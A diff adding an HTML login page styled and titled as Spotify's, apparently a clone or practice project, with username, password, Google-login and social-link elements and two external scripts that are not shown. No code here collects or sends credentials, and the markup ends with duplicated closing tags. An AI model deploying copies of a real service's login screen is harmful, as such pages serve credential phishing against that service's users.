@@ -1,0 +1,72 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="shortcut icon" type="x-icon" href="logo.png">
+    <title>Spotify Login</title>
+    <link rel="stylesheet" href="loginspotify.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css"> <!-- Font Awesome for icons -->
+    </head>
+    <body>
+        <div class="topbar">
+            <button class="topbar-btn">Help</button>
+            <button class="topbar-btn">About</button>
+        </div>
+        <div class="login-container">
+            <div class="login-box">
+                <h2>Spotify Login</h2>
+                <form id="loginForm">
+                    <div class="input-group">
+                        <label for="username">Username</label>
+                        <input type="text" id="username" name="username" required>
+                    </div>
+                    <div class="input-group">
+                        <label for="password">Password</label>
+                        <div class="password-input">
+                            <input type="password" id="password" name="password" required>
+                            <span class="toggle-password">
+                                <i class="far fa-eye"></i>
+                            </span>
+                        </div>
+                    </div>
+                    <div class="input-group checkbox-group">
+                        <label>
+                            <input type="checkbox" id="remember-me"> Remember Me
+                        </label>
+                        <a href="#" class="forgot-password">Forgot Password?</a>
+                    </div>
+                    <div class="input-group">
+                        <label for="google-login"></label>
+                        <button type="button" id="google-login">
+                            <img src="Logo_Google-512.webp" alt="Google Logo" class="google-logo">
+                            Login with Google
+                        </button>
+                    </div>
+                    <button type="submit">Login</button>
+                </form>
+                <p id="loginMessage" class="hidden">Login Successful. Redirecting...</p>
+                <p id="caps-lock-warning" class="hidden">Caps Lock is on.</p>
+                <p id="session-expiry-warning" class="hidden">Your session will expire soon due to inactivity.</p>
+            </div>
+            <div class="connect-with-us">
+                <p>Connect with us via:</p>
+                <div class="social-icons">
+                    <a href="https://www.instagram.com/spotify/" target="_blank"><i class="fab fa-instagram"></i></a>
+                    <a href="https://twitter.com/spotify" target="_blank"><i class="fab fa-twitter"></i></a>
+                    <a href="https://www.facebook.com/Spotify" target="_blank"><i class="fab fa-facebook"></i></a>
+                    <!-- Replace href links with actual social media pages of Spotify -->
+                </div>
+            </div>
+        </div>
+    
+        <script src="script.js"></script>
+    </body>
+    </html>
+    
+
+
+
+    <script src="spotifylogin.js"></script>
+</body>
+</html>
